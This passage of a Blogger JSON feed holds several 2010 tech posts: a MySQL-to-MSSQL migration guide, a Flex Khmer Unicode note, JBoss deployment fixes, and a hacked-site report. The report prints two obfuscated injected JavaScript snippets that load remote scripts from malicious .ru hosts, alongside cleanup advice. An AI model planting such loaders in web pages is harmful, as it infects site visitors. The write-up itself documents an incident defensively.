href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8HE68X-Jahr9kb1oeewPwjY-n5jE69GVL4fEwhREKlsImaG-CkWzSCxXn4CevDKp284U1aEujGA1RqOJNR3bKwrup9r8d8FzWVxcTKCGHxY-V_1hm6ABy71Iynj9gonfBRnYXXtfPbjH8/s1600-h/migrate_mysql_mssql2k5_mssql-11.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 296px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8HE68X-Jahr9kb1oeewPwjY-n5jE69GVL4fEwhREKlsImaG-CkWzSCxXn4CevDKp284U1aEujGA1RqOJNR3bKwrup9r8d8FzWVxcTKCGHxY-V_1hm6ABy71Iynj9gonfBRnYXXtfPbjH8/s400/migrate_mysql_mssql2k5_mssql-11.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440996784650767842\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 3:</span> Create new database (in case, it's new) Ex: mySqlDbLink (not mandatory naming)<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQSRWHyw7UNtKdAelq_1oIWqKVEp4mXiOfoKldejo4X6Hfcq-C_QcDfFd1cou6ZqcTh-S6veBSpgifjv_lr1j_72uLNJB8v-QzA780hpes_HZQ1gSuvFcvm-qcIy1rG7iqgEtldMA28PrM/s1600-h/migrate_mysql_mssql2k5_mssql-12.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 359px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQSRWHyw7UNtKdAelq_1oIWqKVEp4mXiOfoKldejo4X6Hfcq-C_QcDfFd1cou6ZqcTh-S6veBSpgifjv_lr1j_72uLNJB8v-QzA780hpes_HZQ1gSuvFcvm-qcIy1rG7iqgEtldMA28PrM/s400/migrate_mysql_mssql2k5_mssql-12.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440995244239609170\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 4:</span> Right click on the db you want to import all tables / data, choose Import task<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrCxoHWQEFnQ11pVZdD9t2ornYPGOQRejGg6VupW3zBIgrUg1s6XywtSLH37vOkyDTkONtEn8PZ-hzV_qMlDzi9b-YsPqc2udwCPod9ZGkUzYOR6sh7J5_HXDtxOd5yeDidjfbuJkTVhk7/s1600-h/migrate_mysql_mssql2k5_mssql-13.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 370px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrCxoHWQEFnQ11pVZdD9t2ornYPGOQRejGg6VupW3zBIgrUg1s6XywtSLH37vOkyDTkONtEn8PZ-hzV_qMlDzi9b-YsPqc2udwCPod9ZGkUzYOR6sh7J5_HXDtxOd5yeDidjfbuJkTVhk7/s400/migrate_mysql_mssql2k5_mssql-13.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440995113037267010\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 5:</span> Choose data source: Microsoft Access and link the file name with above access db (Ex: Z:\\LinkToImport.mdb)<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis7SL5pxEq8ZO5MZRgsaQe8clWvgbr09rOWUemKB1-hysIiT2TAZxFOGPAaSwbe_jd42fuvw06E8Sh0zYEPmxjFw53x39r8JNbzsV80w6p2xG-U2MgeMgILz9VSBjUl8qTqBVU_aG4c8mW/s1600-h/migrate_mysql_mssql2k5_mssql-14.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 378px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis7SL5pxEq8ZO5MZRgsaQe8clWvgbr09rOWUemKB1-hysIiT2TAZxFOGPAaSwbe_jd42fuvw06E8Sh0zYEPmxjFw53x39r8JNbzsV80w6p2xG-U2MgeMgILz9VSBjUl8qTqBVU_aG4c8mW/s400/migrate_mysql_mssql2k5_mssql-14.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440995025974676338\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 6:</span> Follow all steps of importing wizard but here choose: Copy data from one or more tables or views<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjItdzVvAC4xFg2Jf47NleJRazdCRI11ysohDkYYyR4meYwDrYW_DsT4BS7yyiGDWF1S3ds0XJG8ddzBK9L9sx93zxcI9D29icmZPr2M9Pkdvg-MzBJ51A4Yq5tKwRdT_XhWnO8TQ4AimkD/s1600-h/migrate_mysql_mssql2k5_mssql-15.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 378px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjItdzVvAC4xFg2Jf47NleJRazdCRI11ysohDkYYyR4meYwDrYW_DsT4BS7yyiGDWF1S3ds0XJG8ddzBK9L9sx93zxcI9D29icmZPr2M9Pkdvg-MzBJ51A4Yq5tKwRdT_XhWnO8TQ4AimkD/s400/migrate_mysql_mssql2k5_mssql-15.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440994962913844034\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Step 7:</span> Follow other instruction (select all tables as example), proceed the import<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHFSFqCoWycyI2y_zj3SS4615VLhwqaQq_fatWJwCVSaePLNsyZipaz3kEX6yX0azpvdDRVSUggU6HqNoy6-qAWoM66GTuy-PZi8XGaZ-ME91G2sdPICIM4o-AX-OqVKmkRP-nVynEMh49/s1600-h/migrate_mysql_mssql2k5_mssql-15.JPG\"></a><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9C-A7Cb9VS_Pm3Whc-sJ0YTXYoefzfo4MmwuP8XoyvlMlTwQ53im_N1vp9JpVuyqYAzkw1nrKiCOxS-oIZUNrMO9kBLw9Cwp2VCJ_GIl1zTvYThZtgDPFPDKzOSounm25zNOD-EM6aHlr/s1600-h/migrate_mysql_mssql2k5_mssql-16.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 378px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9C-A7Cb9VS_Pm3Whc-sJ0YTXYoefzfo4MmwuP8XoyvlMlTwQ53im_N1vp9JpVuyqYAzkw1nrKiCOxS-oIZUNrMO9kBLw9Cwp2VCJ_GIl1zTvYThZtgDPFPDKzOSounm25zNOD-EM6aHlr/s400/migrate_mysql_mssql2k5_mssql-16.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440994769767664402\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Caution</span>: During my process, I got error and all tables are not imported; I didn't try to find to know why, but  I just try my work for me solution in next comment.<br /><div style=\"text-align: center;\"><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi13q_yMyxULBiS40SCqQqv3h8MkddQD-F6NpeAlzJEpjhV8m0-ZXzWepi-TivS4c6Yl6oUBMmsdoWiMHzp5LyKPz4EqHwBXrCdnw95Vlgf8IsLUuuyUdGkn0NyTjNZgTVpiU9ZmMnpJwnk/s1600-h/migrate_mysql_mssql2k5_mssql-17-error.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 378px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi13q_yMyxULBiS40SCqQqv3h8MkddQD-F6NpeAlzJEpjhV8m0-ZXzWepi-TivS4c6Yl6oUBMmsdoWiMHzp5LyKPz4EqHwBXrCdnw95Vlgf8IsLUuuyUdGkn0NyTjNZgTVpiU9ZmMnpJwnk/s400/migrate_mysql_mssql2k5_mssql-17-error.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440994697463270994\" border=\"0\" /></a><br /></div><div style=\"text-align: center;\"><span style=\"font-weight: bold;\">See error log:</span><br /><div style=\"text-align: left;\"><blockquote>- Pre-execute (Error)<br />Messages<br />* Error 0xc0202009: {97D241BA-4215-4D82-A8CE-716288708210}: An OLE DB error has occurred. Error code: 0x80004005.<br />An OLE DB record is available.  Source: \"Microsoft JET Database Engine\"  Hresult: 0x80004005  Description: \"Unspecified error\".<br /> (SQL Server Import and Export Wizard)<br /><br />* Error 0xc020801c: Data Flow Task: The AcquireConnection method call to the connection manager \"SourceConnectionOLEDB\" failed with error code 0xC0202009.<br /> (SQL Server Import and Export Wizard)<br /><br />* Error 0xc004701a: Data Flow Task: component \"Source 32 - wp_bp_messages_messages\" (2627) failed the pre-execute phase and returned error code 0xC020801C.<br /> (SQL Server Import and Export Wizard)</blockquote><span style=\"font-weight: bold;\">My WORK FOR ME Solution:</span><br /><ul><li>I again re-import the database with one table and I got successful imported</li><li>I start again re-import for all tables, and I got successful with all tables list:</li></ul></div></div><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2G1Ev0OBGQL9OYxjOgQxCkxQ16t10QIegB-cLiFi1PiH6TS_4BtkCSDjdhpl11nNPwCc9UThs0GEIFrKHk-cXh72JaqLMQjH3kAOlBGeqdzQwRgYsd4fD-Z9L8oi-RuXfvrOdQRD1OFyr/s1600-h/migrate_mysql_mssql2k5_mssql-17-ok.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 378px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2G1Ev0OBGQL9OYxjOgQxCkxQ16t10QIegB-cLiFi1PiH6TS_4BtkCSDjdhpl11nNPwCc9UThs0GEIFrKHk-cXh72JaqLMQjH3kAOlBGeqdzQwRgYsd4fD-Z9L8oi-RuXfvrOdQRD1OFyr/s400/migrate_mysql_mssql2k5_mssql-17-ok.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440994349180535042\" border=\"0\" /></a><br /><span style=\"font-weight: bold;\">Finally:</span> Check at the database, found all tables listed here and check some tables, data are there.<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfFwni66i7hAZiAfVCE9123mtHv_zkh7Vo8XoO9T7Yte0j_s1Q2Ffr0qhM0jipamS2w0BPYk23rquE_KmCWWep6OnGOsfG31XfaZxqWHuQvAavap-R9Qr4vNxQ9aiyp4YEgJ340r4lEIr6/s1600-h/migrate_mysql_mssql2k5_mssql-18.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 345px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfFwni66i7hAZiAfVCE9123mtHv_zkh7Vo8XoO9T7Yte0j_s1Q2Ffr0qhM0jipamS2w0BPYk23rquE_KmCWWep6OnGOsfG31XfaZxqWHuQvAavap-R9Qr4vNxQ9aiyp4YEgJ340r4lEIr6/s400/migrate_mysql_mssql2k5_mssql-18.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5440999365450274386\" border=\"0\" /></a><br />Hope it helps,<br />Check and give comment if anything to update.<br />What I have read:<br /><ul><li><a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/abb4d339-e0d0-42b8-a56f-bbe91cf4867d\">http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/abb4d339-e0d0-42b8-a56f-bbe91cf4867d</a> (Idea got from this forum)<br /></li><li><a href=\"http://www.aspfree.com/c/a/Microsoft-Access/Importing-Data-into-MS-Access-with-ODBC/\">http://www.aspfree.com/c/a/Microsoft-Access/Importing-Data-into-MS-Access-with-ODBC/</a> (For importing data into ms-access, it's using MS Access 2003)<br /></li><li><a href=\"http://www.codeproject.com/KB/database/migrate-mysql-to-mssql.aspx\">http://www.codeproject.com/KB/database/migrate-mysql-to-mssql.aspx</a> (not follow all, as not work for me)</li></ul>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/3497898768169177566/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/02/migrate-from-mysql-to-ms-sql-2005-using.html#comment-form",
+            "title": "1 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/3497898768169177566"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/3497898768169177566"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/02/migrate-from-mysql-to-ms-sql-2005-using.html",
+            "title": "Migrate from MySQL to MS SQL 2005 using MS Access 2003 as a bridge"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhU86Q3YuQgA6B65F4QRKnQ12sJPZt5VcpX6Xf3QQ7aEtC5JNG4XuFxDGIzGJQHI-bKV_bsCtC9DC-k0pEBja_EA4dM761AM_PnsbMgjmsaMR561VhkEYtZb-Mi16Q-FTSPRkpIYTq7rzH0/s72-c/migrate_mysql_mssql2k5_1.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "1"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-462343651716842057"
+        },
+        "published": {
+          "$t": "2010-02-02T23:05:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-02-10T03:52:19.421-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Flex"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Flex 3.x working with Khmer Unicode ?"
+        },
+        "content": {
+          "type": "html",
+          "$t": "I start a topic now with Flex 3 not rendering well with Khmer Unicode.<br /><br />If anyone has any idea, please share; I'll do after some test first.<br /><br /><span style=\"font-weight: bold;\">Updated 10/02/2010:</span><br />Embaded font still not work in flex 3:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSOaa6E7pd52LJ0kNTCWlUP0itN3WjcE_9wK18pgdLFnnA4tpEsRqmNMaYVn4kX0d7EMTj8stB6UnN3Q0G_xU25cRoCqVgsyCMr358RD-YVKDDH4OLw3cdEasq1G3_We2Jrsgn7P_J5-pT/s1600-h/flexkhmerunicode_error.JPG\"><img style=\"display: block; margin: 0px auto 10px; text-align: center; cursor: pointer; width: 400px; height: 396px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSOaa6E7pd52LJ0kNTCWlUP0itN3WjcE_9wK18pgdLFnnA4tpEsRqmNMaYVn4kX0d7EMTj8stB6UnN3Q0G_xU25cRoCqVgsyCMr358RD-YVKDDH4OLw3cdEasq1G3_We2Jrsgn7P_J5-pT/s400/flexkhmerunicode_error.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5436581186929522642\" border=\"0\" /></a><br />To continue more test and find."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/462343651716842057/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/02/flex-3x-working-with-khmer-unicode.html#comment-form",
+            "title": "2 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/462343651716842057"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/462343651716842057"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/02/flex-3x-working-with-khmer-unicode.html",
+            "title": "Flex 3.x working with Khmer Unicode ?"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSOaa6E7pd52LJ0kNTCWlUP0itN3WjcE_9wK18pgdLFnnA4tpEsRqmNMaYVn4kX0d7EMTj8stB6UnN3Q0G_xU25cRoCqVgsyCMr358RD-YVKDDH4OLw3cdEasq1G3_We2Jrsgn7P_J5-pT/s72-c/flexkhmerunicode_error.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "2"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-4309162192076966790"
+        },
+        "published": {
+          "$t": "2010-01-26T20:18:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-01-28T21:55:38.916-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Hack"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Virus"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Website hacked with random URL to access (http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080/)"
+        },
+        "content": {
+          "type": "html",
+          "$t": "One of my website has been hacked by some hacker or can be with some libraries I am using for my CodeIgniter project... I'm not sure if it is due to the library or about my web hosting place.... I'm still investigating the issue.<br /><br />It is trying to access to random URL as :<br /><br /><blockquote>http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080/apple.com/apple.com/drudgereport.com/google.com/joy.cn/</blockquote>Mostly the random URL start with:<br /><blockquote>http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080</blockquote><br />Check to webnetlinks.ru I got alert from WOT (Add-on of firefox) that this site is unsafe.<br /><br />View my page source code found:<br /><ul><li>Following script before html tag<br /></li></ul><blockquote><pre><br />&lt;script src='+'h^&amp;)t($t)$#p&amp;($^$:@$/)^)/)^@(k^^^!u)))6@(-&amp;^c((!!o#@^m#.@&amp;h#@a()<br />(b!e@)!r!##t(@^u&amp;r$#k$.!#c)!o@(&amp;m&amp;@.^&amp;@c@@#a^)r$#^!&amp;e&amp;$^@e@#)!r@&amp;b^)u)^i!<br />(l)(d&amp;@e)!#r!)(-(c!^^o$^m^^!.!!&amp;w^&amp;(e(!^b!#)^!n!#)e#<br />(&amp;)t!&amp;l##!^!i&amp;@n#$k$&amp;s)&amp;#.&amp;@!$r@)@u$!):$8)^&amp;0$$!8&amp;!0)<br />(#$/)$a)#p!$p$l&amp;#e&amp;#.^^@#c#o$$&amp;)m$$#/!)a^@@$p)!p)l^#e&amp;!.!$#c#(@o)$)^m((&amp;<br />/&amp;&amp;d^&amp;r$@u!@^d^)&amp;g$$)e#$@r(^e(^!p&amp;^o@!^&amp;r^^)#t)&amp;(#.)$^c()o^)m(@@<br />/@@g$&amp;#^#o#o$g&amp;l#!e(&amp;.#!(c^&amp;o^$m)#&amp;&amp;/$j$o#$)y).@^c&amp;)n(@&amp;/!@'.replace(/\\$|\\!|\\)|<br />\\^|#|@|\\(|&amp;/ig, '')+' defer=defer>&lt;/scr'+'ipt><br /></pre></blockquote><br /><ul><li>At the end of html tag found some hidden code:</li></ul><blockquote>82fd50e7972f75db5204eef49fd077cc</blockquote><br /><br />All those above, I didn't code so consider this point to start searching.<br /><br />Note: I have no any issue at my local site.<br /><br />Hope I'll find soon<br /><br /><span style=\"font-weight: bold;\">Update 27/01, 1:30pm</span>: Very bad, these scripts are added to most html pages, to most javascript files. Seem not issue due to any library of CodeIgniter but with some virus who can hack using ftp, it may be my password is very poor that it can hack.<br /><br /><span style=\"font-weight: bold;\">Update 29/01, 12:48pm</span>: Now again, new hack script added the same site (before I didn't change ftp password yet), here is the new script:<br /><br /><blockquote><pre><br />try{window.onload=function(){document.write('&lt;div id=\"megaid\">youjizz-com.oneindia.in.d&lt;/div>');Lb4bz8i1odh = document.getElementById('megaid').innerHTML + 'u$#!$^o#@@w&amp;a(n(@!-$$$c@(o$)!$m)&amp;$@!.!)$(@t)^o($(p)!#l$i$@n#$^e&amp;^(m@#&amp;a@$^#r^^i@@^(n$e^##.#r&amp;^$u(@^:)$D@!#E^()B^&amp;U!(@&amp;G#$#$/&amp;&amp;(s#^$p@(!(o$n&amp;@i$)c@^h$#i^@$.^c&amp;(o)$.(!j#@(p(!^^!/$s#!p(!&amp;^o#n@)#i^!c##h)#)i(@.@!&amp;^c(#o))@!.!j(^#p^^!!/@(^#@x)@t#!e!#$)n$)^d!(m@e@d((i&amp;^!a^$!&amp;).)@)#(c)$#o&amp;^^#m#@$/!^^&amp;g$@$o#o@!(g&amp;!@#l#@#e#.@$@#c!(o^m)!^/&amp;a!)l(!(i@c$!&amp;e(^^.)!#^i^#$t($/@&amp;'.replace(/@|\\$|#|&amp;|\\^|\\!|\\)|\\(/ig, '') ;document.write('&lt;scr'+'ipt src=\"http://%27+Lb4bz8i1odh.replace%28/DEBUG/g,\">&lt;/scr'+'ipt>');} }  catch(Ijhdnoxns ) {}<br />&lt;!--82fd50e7972f75db5204eef49fd077cc-->&lt;script> try{window.onload=function(){document.write('&lt;div id=\"megaid\">youjizz-com.oneindia.in.d&lt;/div>');Lb4bz8i1odh = document.getElementById('megaid').innerHTML + 'u$#!$^o#@@w&amp;a(n(@!-$$$c@(o$)!$m)&amp;$@!.!)$(@t)^o($(p)!#l$i$@n#$^e&amp;^(m@#&amp;a@$^#r^^i@@^(n$e^##.#r&amp;^$u(@^:)$D@!#E^()B^&amp;U!(@&amp;G#$#$/&amp;&amp;(s#^$p@(!(o$n&amp;@i$)c@^h$#i^@$.^c&amp;(o)$.(!j#@(p(!^^!/$s#!p(!&amp;^o#n@)#i^!c##h)#)i(@.@!&amp;^c(#o))@!.!j(^#p^^!!/@(^#@x)@t#!e!#$)n$)^d!(m@e@d((i&amp;^!a^$!&amp;).)@)#(c)$#o&amp;^^#m#@$/!^^&amp;g$@$o#o@!(g&amp;!@#l#@#e#.@$@#c!(o^m)!^/&amp;a!)l(!(i@c$!&amp;e(^^.)!#^i^#$t($/@&amp;'.replace(/@|\\$|#|&amp;|\\^|\\!|\\)|\\(/ig, '') ;document.write('&lt;scr'+'ipt src=\"http://'+Lb4bz8i1odh.replace(/DEBUG/g,\">&lt;/scr'+'ipt>');} }  catch(Ijhdnoxns ) {}&lt;/script><br />&lt;!--82fd50e7972f75db5204eef49fd077cc--><br /></pre></blockquote><br /><span style=\"font-weight: bold;\">Related issue found on the net:</span><br /><ol><li><a href=\"http://blog.unmaskparasites.com/2009/12/23/from-hidden-iframes-to-obfuscated-scripts/\">http://blog.unmaskparasites.com/2009/12/23/from-hidden-iframes-to-obfuscated-scripts/</a></li><li><a href=\"http://blog.unmaskparasites.com/2009/09/23/10-ftp-clients-malware-steals-credentials-from/\">http://blog.unmaskparasites.com/2009/09/23/10-ftp-clients-malware-steals-credentials-from/</a><br /></li></ol><br /><span style=\"font-weight: bold;\">Solutions:</span> (that may can prevent not to happen again)<br />I'm using FileZilla as a ftp client<br /><ol><li>Change ftp password</li><li>Change application password</li><li>Scan virus on the pc that using</li><li>Remove all storing passwords on FTP clients<br /></li></ol>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/4309162192076966790/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/website-hacked-with-random-url-to.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/4309162192076966790"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/4309162192076966790"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2010/01/website-hacked-with-random-url-to.html",
+            "title": "Website hacked with random URL to access (http://ku6-com.haberturk.com.careerbuilder-com.webnetlinks.ru:8080/)"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-1726627372255820343"
+        },
+        "published": {
+          "$t": "2010-01-25T19:14:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2010-01-25T19:40:32.825-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "J2EE"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Jboss"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "JBoss 4.2.2.GA - Deploying issue on class loading and out of memory"
+        },
+        "content": {
+          "type": "html",
+          "$t": "While deploying my applications with JBoss 4.2.2.GA, using JDK 1.5 I got some issue with class loading issue something like:<br /><br />1. If meet such error:<br /><pre><code>org.jboss.deployment.DeploymentException: Error while fixing table name; - nested throwable: (org.jboss.util.NestedSQLException: Could not create connection; - nested throwable: (org.jboss.resource.JBossResourceException: Failed to register driver for: oracle.jdbc.driver.OracleDriver; - nested throwable: (java.lang.ClassNotFoundException: No ClassLoaders found for: oracle.jdbc.driver.OracleDriver)); - nested throwable: (org.jboss.resource.JBossResourceException: Could not create connection; - nested throwable: (org.jboss.resource.JBossResourceException: Failed to register driver for: oracle.jdbc.driver.OracleDriver; - nested throwable: (java.lang.ClassNotFoundException: No ClassLoaders found for: oracle.jdbc.driver.OracleDriver))))</code></pre><br /><br />For sure, missing Oracle JDBC driver so Copy the Oracle JDBC Driver (10.2.0.1.0) (ojdbc14.jar) to lib folder of %JBOSS_HOME%/lib or at your server %JBOSS_HOME%/server/default/lib directory.<br /><br />2. If something around:<br /><pre><code><br />2010-01-25 15:03:27,113 DEBUG [org.jboss.web.tomcat.service.TomcatDeployer] Classes needed for clustered webapp unavailable<br />java.lang.NoClassDefFoundError: org/jgroups/blocks/MethodCall<br />at org.jboss.web.tomcat.service.session.JBossCacheService.<clinit>(JBossCacheService.java:70)<br />at org.jboss.web.tomcat.service.session.JBossCacheManager.init(JBossCacheManager.java:157)<br />at org.jboss.web.tomcat.service.TomcatDeployer.performDeployInternal(TomcatDeployer.java:336) </clinit></code></pre><br />So please try as following:<br /><ul><li>Define a isolated classloader. To do it, change  %JBOSS_HOME%/server/default/conf/jboss-service.xml :</li></ul><pre><code>&lt;mbean code=\"org.jboss.naming.NamingService\" name=\"jboss:service=Naming\" dd=\"resource:xmdesc/NamingService-xmbean.xml\"&gt;<br />[ ... ]<br />&lt;attribute name=\"CallByValue\"&gt;true&lt;/attribute&gt;<br />[ ... ]<br />&lt;/mbean&gt;<br /><br /></code></pre><ul><li><code>change %JBOSS_HOME%/server/default/deploy/ear-deployer.xml :</code><br /></li></ul><pre><code>&lt;server&gt;<br />[...]<br />&lt;attribute name=\"Isolated\"&gt;true&lt;/attribute&gt;<br />[...]<br />&lt;attribute name=\"CallByValue\"&gt;true&lt;/attribute&gt;<br />[...]<br />&lt;/server&gt;<br /><br /></code></pre><ul><li><code>change %JBOSS_HOME%/server/default/deploy/jboss-web.deployer/META-INF/jboss-service.xml :</code><br /></li></ul><pre><code>[...]<br />&lt;attribute name=\"Java2ClassLoadingCompliance\"&gt;true&lt;/attribute&gt;<br />[...]<br />&lt;attribute name=\"UseJBossWebLoader\"&gt;true&lt;/attribute&gt;<br />[...]</pre><br /><br />3. When you wanna to deploy more than 2 applications on the same 